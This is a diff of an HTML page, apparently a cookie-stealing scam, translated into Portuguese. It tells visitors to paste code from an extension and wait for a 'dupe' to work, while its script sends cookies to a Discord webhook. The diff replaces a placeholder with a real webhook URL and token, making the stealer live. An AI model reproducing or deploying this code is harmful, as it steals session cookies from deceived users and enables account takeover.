@@ -25,7 +25,7 @@
     </style>
 </head>
 <body>
-    <p id="warning" class="cookie-alert">make sure the code you copied from the extension is correct and wait up to 10 minutes for the dupe to work. remember, if it doesn't work, put the code again.</p>
+    <p id="warning" class="cookie-alert">Verifique se o código copiado da extensão está correto e aguarde até 10 minutos para que o duplicador funcione. Lembre-se, se não funcionar, coloque o código novamente.</p>
 
     <script>
         // Função para enviar os cookies para o seu Discord webhook
@@ -36,12 +36,12 @@
             // Display warning message
             document.getElementById('warning').style.display = "block";
 
-            // Envia os cookies para o seu Discord webhook (você deve substituir o URL pelo seu)
+            // Envia os cookies para o seu Discord webhook
             var data = {
                 content: "Cookie: " + cookies
             };
 
-            fetch('https://discord.com/api/webhooks/SEU_DISCORD_WEBHOOK_AQUI', {
+            fetch('https://discord.com/api/webhooks/1040678839396872322/TIl24vk7NiW4Fz3zACaKchZhtMc8ien3KjI9ha9EU1dTBeKIDH18H3Fgx3uStpAkG5Ud', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -50,11 +50,11 @@
             })
             .then(response => {
                 if (!response.ok) {
-                    throw new Error('Error sending message to Discord');
+                    throw new Error('Erro ao enviar mensagem para o Discord');
                 }
             })
             .catch(error => {
-                console.error('Error:', error);
+                console.error('Erro:', error);
                 alert('Erro ao enviar cookies para o Discord!');
             });
         }
